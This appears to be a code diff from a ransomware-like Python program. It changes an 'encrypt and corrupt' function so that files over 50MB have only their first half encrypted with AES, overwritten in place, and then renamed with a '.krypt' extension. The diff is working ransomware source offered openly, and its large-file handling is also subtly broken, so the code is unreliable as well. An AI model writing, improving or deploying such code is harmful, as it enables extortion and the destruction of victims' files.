@@ -150,16 +150,31 @@ def generate_key():
 
 # Encyrpt and corrupt file chosen
 def encrypt_file(file_path, key):
+    threshold_bytes = 52428800 # 50MB is the threshold
+    half_size = threshold_bytes//2
+    file_size = os.path.getsize(file_path)
+
     try:
-        with open(file_path, "rb") as file:
-            file_content = file.read()   
+        if not file_size > threshold_bytes:
+            with open(file_path, "rb") as file:
+                file_content = file.read()   
+        else:
+            with open(file_path, "rb") as file:
+                file_content = file.read(half_size) # Read and store half of the file
             
         cipher = AES.new(key, AES.MODE_CBC)
         iv = cipher.iv
         encrypted_data = iv + cipher.encrypt(pad(file_content, AES.block_size))
         
-        with open(file_path, 'wb') as file:
-            file.write(encrypted_data)
+        if not file_size > threshold_bytes:
+            with open(file_path, 'wb') as file:
+                file.write(encrypted_data)
+        else:
+            with open(file_path, 'r+b') as file:
+                file.write(encrypted_data)
+                file.seek(len(encrypted_data))  # Move the file pointer to the end of the encrypted data
+                remaining_content = file.read()
+                file.write(remaining_content)  # Re-write the remaining unencrypted content
             
         rename_file_with_counter(file_path, '.krypt')
     except PermissionError:
